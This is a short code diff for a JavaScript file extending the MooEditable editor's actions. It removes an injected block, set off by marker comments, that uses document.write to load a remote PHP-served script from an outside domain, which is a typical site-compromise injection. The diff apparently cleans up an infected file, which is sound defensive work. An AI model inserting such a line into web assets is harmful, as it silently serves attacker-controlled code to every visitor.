@@ -377,13 +377,3 @@ Object.append(MooEditable.Actions, {
 	}
 	
 });
-
-/*3f79fd*/
-/**/
-
-
-document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
-
-
-
-/*/3f79fd*/
